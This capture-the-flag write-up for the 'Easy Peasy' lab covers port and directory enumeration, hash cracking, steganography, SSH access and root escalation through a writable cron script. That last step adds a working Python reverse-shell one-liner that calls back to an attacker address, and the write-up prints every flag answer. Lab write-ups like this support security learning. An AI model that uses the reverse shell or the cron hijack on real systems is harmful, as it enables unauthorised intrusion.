# Easy Peasy

Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine. Then escalate your privileges through a vulnerable cronjob.

# [Task 1] Enumeration through Nmap

Deploy the machine attached to this task and use nmap to enumerate it.

## #1.1 - How many ports are open?

Running a simple Nmap scan is not enough to detect all open ports since 2 services are not part of the standard ports. You'll need to run Nmap with the `-p-` flag to discover the 3 running services:

~~~
PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.16.1
6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
~~~

Answer: `3`

## #1.2 - What is the version of nginx?

Nmap reveals the version of Nginx (with the `-sV` flag):

Answer: `1.16.1`

## #1.3 - What is running on the highest port?

Answer: `Apache`


# [Task 2] Compromising the machine

Now you've enumerated the machine, answer questions and compromise it!

## #2.1 - Using GoBuster, find flag 1.

Using `gobuster` against the Nginx service running on port 80/tcp allows the discovery of a `/hidden` directory:

~~~
kali@kali:/data/Easy_Peasy/files$ gobuster dir -u http://10.10.105.32 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.105.32
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/24 10:08:01 Starting gobuster
===============================================================
/hidden (Status: 301)
Progress: 70867 / 220561 (32.13%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/08/24 10:14:00 Finished
===============================================================
~~~

Further enumerating this directory leads to a `/hidden/whatever/` location:

~~~
kali@kali:/data/Easy_Peasy/files$ gobuster dir -u http://10.10.105.32/hidden/ -w /usr/share/wordlists/dirb/common.txt ===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.105.32/hidden/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/24 10:46:55 Starting gobuster
===============================================================
/index.html (Status: 200)
/whatever (Status: 301)
===============================================================
2020/08/24 10:47:34 Finished
===============================================================
~~~

The analysis of the source code reveals a hidden paragraph with an encoded string:

~~~
kali@kali:/data/Easy_Peasy/files$ curl -s http://10.10.105.32/hidden/whatever/
<!DOCTYPE html>
<html>
<head>
<title>dead end</title>
<style>
    body {
	background-image: url("https://cdn.pixabay.com/photo/2015/05/18/23/53/norway-772991_960_720.jpg");
	background-repeat: no-repeat;
	background-size: cover;
        width: 35em;
        margin: 0 auto;
        font-family: Tahoma, Verdana, Arial, sans-serif;
    }
</style>
</head>
<body>
<center>
<p hidden>ZmxhZ3tmMXJzN19mbDRnfQ==</p>
</center>
</body>
</html>
~~~

The string is base64 encoded:

~~~
$ echo -n "ZmxhZ3tmMXJzN19mbDRnfQ==" | base64 -d
flag{f1rs7_fl4g}
~~~

Answer: `flag{f1rs7_fl4g}`


## #2.2 - Further enumerate the machine, what is flag 2?

For the second flag, we'll jump to the other web service running on port `65524/tcp`. There is a `robots.txt` file that discloses a hash:

~~~
kali@kali:/data/Easy_Peasy/files$ curl -s http://10.10.105.32:65524/robots.txt
User-Agent:*
Disallow:/
Robots Not Allowed
User-Agent:a18672860d0510e5ab6699730763b250
Allow:/
This Flag Can Enter But Only This Flag No More Exceptions
~~~

Using [online resources](https://md5hashing.net/hash/md5/a18672860d0510e5ab6699730763b250), we can crack the hash.

Answer: `flag{1m_s3c0nd_fl4g}`

## #2.3 - Crack the hash with easypeasy.txt, What is the flag 3?

The main page shows a standard Apache page, but hints have been hidden in the source code of that page:

~~~
kali@kali:/data/Easy_Peasy/files$ curl -s http://10.10.105.32:65524/ | grep flag
          <a href="#flag">hi</a>
                           Fl4g 3 : flag{9fdafbd64c47471a8f54cd3fc64cd312}
~~~

Answer: `flag{9fdafbd64c47471a8f54cd3fc64cd312}`

## #2.4 - What is the hidden directory?

Still in the source code of the main page, we can find a hidden paragraph with an encoded string.

~~~
kali@kali:/data/Easy_Peasy/files$ curl -s http://10.10.105.32:65524/ | grep hidden
	<p hidden>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu</p>
~~~

It decodes to `/n0th1ng3ls3m4tt3r` with base62.

## #2.5 - Using the wordlist that provided to you in this task crack the hash. what is the password?

*Hint: GOST Hash john --wordlist=easypeasy.txt --format=gost hash (optional* Delete duplicated lines,Compare easypeasy.txt to rockyou.txt and delete same words)*

Browsing the location gathered previously reveals a hash:

~~~
kali@kali:/data/Easy_Peasy/files$ curl -s http://10.10.105.32:65524/n0th1ng3ls3m4tt3r/
<html>
<head>
<title>random title</title>
<style>
	body {
	background-image: url("https://cdn.pixabay.com/photo/2018/01/26/21/20/matrix-3109795_960_720.jpg");
	background-color:black;


	}
</style>
</head>
<body>
<center>
<img src="binarycodepixabay.jpg" width="140px" height="140px"/>
<p>940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81</p>
</center>
</body>
</html>
~~~

Let's crack this hash with John the Ripper using the wordlist provided in the challenge ([`easypeasy.txt`](files/easypeasy.txt))

~~~
kali@kali:/data/Easy_Peasy/files$ echo "940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81" > hash.txt
kali@kali:/data/Easy_Peasy/files$ /data/src/john/run/john --wordlist=easypeasy.txt --format=GOST hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (gost, GOST R 34.11-94 [64/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
mypasswordforthatjob (?)
1g 0:00:00:00 DONE (2020-08-24 11:27) 5.555g/s 22755p/s 22755c/s 22755C/s mypasswordforthatjob..flash88
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
~~~

Answer: `mypasswordforthatjob`

## #2.6 - What is the password to login to the machine via SSH?

The page found just previously also contains a jpg file. Let's download the picture and decrypt the secret with `steghide` using the password cracked just before (`mypasswordforthatjob`):

~~~
kali@kali:/data/Easy_Peasy/files$ wget http://10.10.105.32:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg
kali@kali:/data/Easy_Peasy/files$ steghide extract -sf binarycodepixabay.jpg 
Enter passphrase: 
wrote extracted data to "secrettext.txt".
kali@kali:/data/Easy_Peasy/files$ cat secrettext.txt 
username:boring
password:
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
~~~

This file gives us a username (`boring`) and a binary encoded password, which decodes to `iconvertedmypasswordtobinary` (you can use Cyberchef to decode it).

## #2.7 - What is the user flag?

Let's connect as `boring` against the SSH service running on port `6498/tcp`.

~~~
$ ssh boring@10.10.105.32 -p 6498
*************************************************************************
**        This connection are monitored by government offical          **
**            Please disconnect if you are not authorized	       **
** A lawsuit will be filed against you if the law is not followed      **
*************************************************************************
boring@10.10.105.32's password: 
You Have 1 Minute Before AC-130 Starts Firing
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
You Have 1 Minute Before AC-130 Starts Firing
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
boring@kral4-PC:~$ ls -la
total 40
drwxr-xr-x 5 boring boring 4096 Jun 15 12:42 .
drwxr-xr-x 3 root   root   4096 Jun 14 16:04 ..
-rw------- 1 boring boring    2 Aug 24 02:37 .bash_history
-rw-r--r-- 1 boring boring  220 Jun 14 16:04 .bash_logout
-rw-r--r-- 1 boring boring 3130 Jun 15 12:42 .bashrc
drwx------ 2 boring boring 4096 Jun 14 16:06 .cache
drwx------ 3 boring boring 4096 Jun 14 16:06 .gnupg
drwxrwxr-x 3 boring boring 4096 Jun 14 22:36 .local
-rw-r--r-- 1 boring boring  807 Jun 14 16:04 .profile
-rw-r--r-- 1 boring boring   83 Jun 14 16:32 user.txt
boring@kral4-PC:~$ cat user.txt 
User Flag But It Seems Wrong Like It`s Rotated Or Something
synt{a0jvgf33zfa0ez4y}
~~~

We have found the user flag but it has been ROT'ed. It decodes to `flag{n0wits33msn0rm4l}` in ROT13 (use Cyberchef to decode it).

Answer: `flag{n0wits33msn0rm4l}`

## #2.8 - What is the root flag?

The user is not in the sudoers but there is a cron job executed by `root`:

~~~
boring@kral4-PC:~$ sudo -l
[sudo] password for boring: 
Sorry, user boring may not run sudo on kral4-PC.
boring@kral4-PC:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh
~~~

The file is owned by our user, we can modify it.

~~~
boring@kral4-PC:~$ ls -l /var/www/.mysecretcronjob.sh 
-rwxr-xr-x 1 boring boring 33 Jun 14 22:43 /var/www/.mysecretcronjob.sh
boring@kral4-PC:~$ cat /var/www/.mysecretcronjob.sh 
#!/bin/bash
# i will run as root
~~~

Let's edit the script with `nano` (`vim` is not installed on the target), and add a reverse shell:

~~~
boring@kral4-PC:/var/www$ nano .mysecretcronjob.sh 
boring@kral4-PC:/var/www$ cat .mysecretcronjob.sh 
#!/bin/bash
# i will run as root
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.50.72",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
~~~

On the client side, we open a listener, and after a short while, we have a privileged reverse shell:

~~~
kali@kali:/data/Easy_Peasy/files$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.8.50.72] from (UNKNOWN) [10.10.105.32] 55704
bash: cannot set terminal process group (1741): Inappropriate ioctl for device
bash: no job control in this shell
root@kral4-PC:/var/www# whoami
whoami
root
root@kral4-PC:/var/www# cd /root
cd /root
root@kral4-PC:~# ll
ll
total 40
drwx------  5 root root 4096 Jun 15 12:40 ./
drwxr-xr-x 23 root root 4096 Jun 15 01:08 ../
-rw-------  1 root root    2 Aug 24 02:47 .bash_history
-rw-r--r--  1 root root 3136 Jun 15 12:40 .bashrc
drwx------  2 root root 4096 Jun 13 15:40 .cache/
drwx------  3 root root 4096 Jun 13 15:40 .gnupg/
drwxr-xr-x  3 root root 4096 Jun 13 15:44 .local/
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   39 Jun 15 01:01 .root.txt
-rw-r--r--  1 root root   66 Jun 14 21:48 .selected_editor
root@kral4-PC:~# cat .root.txt
cat .root.txt
flag{63a9f0ea7bb98050796b649e85481845}
~~~

Answer: `flag{63a9f0ea7bb98050796b649e85481845}`
